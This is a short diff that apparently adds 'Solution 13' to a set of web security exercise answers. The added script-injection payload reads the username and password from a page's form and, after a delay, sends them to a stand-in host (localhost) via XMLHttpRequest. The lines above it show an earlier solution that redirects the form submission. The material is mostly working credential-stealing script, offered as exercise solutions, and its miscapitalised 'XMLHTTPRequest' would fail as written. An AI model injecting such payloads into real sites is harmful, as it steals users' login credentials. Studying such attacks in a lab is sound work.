@@ -144,7 +144,26 @@ window.setTimeout( function()
 	document.forms[0].action = 'http://localhost';
 	document.forms[0].submit();
 
-}, 10000 );
+}, 10000);
+	
+</script>
+
+
+* Solution 13: Posting with XML HTTP Request
+
+<script>
+
+username = document.forms[0].elements[0].value;
+password = document.forms[0].elements[1].value;
+
+window.setTimeout( function() 
+
+{
+	var req = new XMLHTTPRequest();
+	req.open("GET", "http://localhost/?username="+username+"&password="+password, true);
+	req.send();
+
+}, 10000);
 	
 </script>
 
